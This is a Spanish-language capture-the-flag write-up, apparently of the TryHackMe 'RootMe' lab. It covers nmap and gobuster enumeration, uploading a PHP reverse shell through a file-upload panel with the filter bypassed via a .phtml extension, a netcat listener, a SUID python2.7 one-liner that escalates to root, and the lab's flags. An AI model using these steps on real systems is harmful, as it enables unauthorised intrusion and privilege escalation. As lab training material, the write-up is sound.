## 1. Enumeracion
Empezamos haciendo nmap a la victima.

```
nmap -sV -sC 10.128.156.46                                                                     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-31 07:16 -0400
Nmap scan report for 10.128.156.46
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 31:bc:9e:bb:37:8a:13:12:6c:fe:7a:9f:93:94:bb:c0 (RSA)
|   256 44:ac:fa:79:f3:65:c2:41:28:ab:98:00:65:d4:14:4a (ECDSA)
|_  256 1a:d3:29:10:d2:b7:5c:54:0d:c0:c5:fb:6e:ed:c3:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds

```

Vemos que tiene abierto ssh y un servidor apache.

## 2. Analisis del apache
Empezamos haciendo un curl a la pagina.
```
curl 10.128.156.46 | cat | tidy -jq                      
HTML Tidy: unknown option: j
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    616 100    616   0      0  11311      0                              0
<!DOCTYPE html>
<html lang="en">
<head>
<meta name="generator" content=
"HTML Tidy for HTML5 for Linux version 5.8.0">
<meta charset="UTF-8">
<meta name="viewport" content=
"width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="css/home.css">
<script src="js/maquina_de_escrever.js"></script>
<title>HackIT - Home</title>
</head>
<body>
<div class="main-div">
<p class="title">root@rootme:~#</p>
<p class="description">Can you root me?</p>
</div>
<!--  -->
<script>
        const titulo = document.querySelector('.title');
        typeWrite(titulo);
</script>
</body>
</html>

```

No vemos nada interesante asi que usamos gobuster en busca de directorios.
```
gobuster dir -u http://10.128.156.46 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.128.156.46
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
css                  (Status: 301) [Size: 312] [--> http://10.128.156.46/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 311] [--> http://10.128.156.46/js/]
panel                (Status: 301) [Size: 314] [--> http://10.128.156.46/panel/]
server-status        (Status: 403) [Size: 278]
uploads              (Status: 301) [Size: 316] [--> http://10.128.156.46/uploads/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

```

## 3. Ejecutamos la shell
Vemos que tiene un uploads y un panel, entramos para ver que tienen.
Al entrar al panel vemos que tiene para subir archivos al servidor. Eso nos sirve para poder subir una revshell y abrir una conexion.

![[Pasted image 20260531132735.png]]

Uso la revshell de pentestmonkey php ya que sabemos que el servidor usa php.

Nos ponemos a escuchar en el puerto donde configuramos la revshell.
```
nc -lvnp 4445 
listening on [any] 4445 ...
```
Al intentar subir la revshell nos salta un error.
![[Pasted image 20260531133142.png]]
Pone que no se pueden subir phps. Asi que lo que hice fue cambiar la extension a phtml.
![[Pasted image 20260531133238.png]]

Ahora vamos a /uploads y ejecutamos la revshell

Conseguimos establecer la conexion y hacemos un whoami.
``` 
whoami
www-data
```

vemos que somos www-data.
Nos piden encontrar la flag.
La flag la encontramos en /var/www.
```
cat user.txt
THM{y0u_g0t_a_sh3ll}
```

## 4. Escalada de privilegios

Nos piden escalar privilegios asi que empezamos buscando los archivos con SUID.
`find / -perm -4000 2>/dev/null`
Entre todos los archivos encontramos uno que resalta.
`/usr/bin/python2.7
Vamos a gtfobins a buscar si se puede escalar privilegios.

Encontramos una shell para escalar privilegios.
`/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
`



La ejecutamos y hacemos un whoami.
```
whoami
root
```

Y encontramos la flag en `/root`
```
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
